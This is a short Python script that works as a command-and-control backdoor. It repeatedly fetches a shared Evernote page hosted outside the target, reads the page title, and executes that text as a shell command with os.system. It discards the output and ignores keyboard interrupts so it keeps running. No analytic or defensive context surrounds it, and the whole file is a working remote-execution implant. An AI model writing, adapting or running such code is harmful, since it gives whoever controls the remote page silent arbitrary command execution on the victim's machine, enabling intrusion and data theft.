try:
    from bs4 import BeautifulSoup
    from requests import get
    from time import sleep
    from os import system
    import lxml

    old_command = ""
    command = ""
except KeyboardInterrupt:
    pass

while True:
    # prevent keyboardinterrupt
    try:
        #get HTML
        try:
            html_file = get("https://www.evernote.com/shard/s721/sh/5ff8aabd-e957-668f-0503-01487d76ba01/GvzSxqlewn4fb3pQpdAww5TUVhNThgVRizYNHu0SI2y5ROrlfE0Dop_EZQ").text
            soup = BeautifulSoup(html_file, 'lxml')
            command = soup.find('title').text
        except:
            print("failed to connect to server")
        #execute command
        if old_command != command:
            try:
                system(f"{command} > /dev/null")
                old_command = command
            except:
                pass
        sleep(0.1)
    except KeyboardInterrupt:
        continue
